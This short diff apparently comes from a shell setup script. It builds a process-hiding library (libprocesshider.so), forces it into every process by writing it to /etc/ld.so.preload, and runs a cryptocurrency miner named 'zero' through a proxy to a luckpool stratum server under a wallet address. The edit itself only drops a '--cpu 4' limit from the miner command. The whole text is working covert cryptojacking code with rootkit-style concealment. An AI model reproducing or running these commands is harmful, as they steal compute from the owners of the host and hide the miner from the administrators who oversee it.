@@ -43,4 +43,4 @@ gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
 mv libprocesshider.so /usr/local/lib/
 echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
 
-./graftcp/graftcp ./zero -c stratum+tcp://na.luckpool.net:3956 -u RAcBGk2mLkXuaG5qYtGeTRbdMQQi5JQ4jc.Bin -p x --cpu 4
+./graftcp/graftcp ./zero -c stratum+tcp://na.luckpool.net:3956 -u RAcBGk2mLkXuaG5qYtGeTRbdMQQi5JQ4jc.Bin -p x
